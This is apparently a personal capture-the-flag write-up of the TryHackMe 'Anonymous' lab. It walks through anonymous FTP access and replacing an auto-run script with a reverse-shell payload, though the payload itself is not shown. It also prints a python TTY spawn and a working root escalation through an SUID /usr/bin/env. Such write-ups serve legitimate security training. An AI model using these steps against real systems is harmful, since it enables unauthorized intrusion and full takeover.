### THM Anonymous

Quickly here again.  Nmap scans bring back that we have ftp, ssh, and smb running on this device.  FTP gives me anonymous login and smb is accessible.  Check smb, find a couple pics of some corgos.  Cute pups but not what I'm here for.

FTP gives anonymous login and was able to find a script in there that runs automatically.

Use FTP to get the files.  Make sure to switch to binary as that will help the downloads go well.

```
ftp> binary
200 Switching to Binary mode.
ftp> mget *
mget clean.sh [anpqy?]? yes
229 Entering Extended Passive Mode (|||13680|)
150 Opening BINARY mode data connection for clean.sh (314 bytes).
100% |************************************************************************************|   314       91.80 KiB/s    00:00 ETA
226 Transfer complete.
314 bytes received in 00:00 (2.71 KiB/s)
mget removed_files.log [anpqy?]? yes
229 Entering Extended Passive Mode (|||28848|)
150 Opening BINARY mode data connection for removed_files.log (4085 bytes).
100% |************************************************************************************|  4085       52.64 MiB/s    00:00 ETA
226 Transfer complete.
4085 bytes received in 00:00 (37.36 KiB/s)
mget to_do.txt [anpqy?]? yes
229 Entering Extended Passive Mode (|||17890|)
150 Opening BINARY mode data connection for to_do.txt (68 bytes).
100% |************************************************************************************|    68        1.70 MiB/s    00:00 ETA
226 Transfer complete.
68 bytes received in 00:00 (0.59 KiB/s)
```

clean.sh is the one we're focused on.  We open it and put in a bash reverse shell one liner.  Then open a nc listener in a different tab and then we upload the new clean.sh file with the malicious payload.

```
ftp> put clean.sh
local: clean.sh remote: clean.sh
229 Entering Extended Passive Mode (|||63096|)
150 Ok to send data.
100% |************************************************************************************|    55        1.19 MiB/s    00:00 ETA
226 Transfer complete.
55 bytes sent in 00:00 (0.24 KiB/s)
```

![foothold](/Images/THM7Anonymous/pic1.png)

At this point, uploaded and ran linpeas.sh and saw that `/usr/bin/env` has the SUID bit set.  Go to GTFObins and see that there is, in fact, an exploit for that one with SUID.

Tried it the first time and got the no tty present error.

So, I try and get a tty going with python.

```
$ python -c 'import pty; pty.spawn("/bin/sh")'
$ /usr/bin/env /bin/sh -p
/usr/bin/env /bin/sh -p
# whoami
whoami
root
```

And we're now root!!  Another quick one.  Got 3 more to do today and 1 last section before I get started on my PNPT exam!!  Let's fkin go!!!

